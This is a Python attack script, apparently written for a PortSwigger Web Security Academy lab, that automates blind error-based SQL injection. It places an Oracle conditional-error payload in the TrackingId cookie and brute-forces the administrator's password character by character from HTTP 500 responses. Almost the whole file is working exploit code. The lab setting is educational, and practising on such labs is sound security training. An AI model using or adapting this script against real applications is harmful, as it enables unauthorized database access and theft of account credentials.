#!/bin/python3  

from pwn import *
import requests, sys, string, signal, pdb, time, subprocess

# Ctrl + C

def ctrl_c(sig, frame):
    print("\n\n[!] Saliendo\n")
    sys.exit(1)


signal.signal(signal.SIGINT, ctrl_c)

# - - - - - - - - - - -
main_url='https://0a260029037420b5c01436fe00b900f7.web-security-academy.net'
characters=string.ascii_lowercase + string.digits

#'||(select case when substr(password,1,1)='§a§' then to_char(1/0) else '' end from users where username='administrator')||'
def run():

    subprocess.run('clear')

    password = ''

    p1 = log.progress('Fuerza bruta')
    p1.status('Iniciando ataque de fuerza bruta...')
    
    time.sleep(2)

    p2 = log.progress('Password')
    
    for position in range(1, 21):
        for character in characters:
            cookies = {
                    "TrackingId": "TrackingId=er6x15q7ms9JEWiK'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character),
                    "session": 'hWKretJ4PCVaZURhFaf2keWndURNeMKU'
                    }
            p1.status(cookies['TrackingId'])
            r = requests.get(main_url, cookies=cookies)

            if r.status_code == 500:
                password+= character
                p2.status(password)
                break


if __name__ == '__main__':
    run()
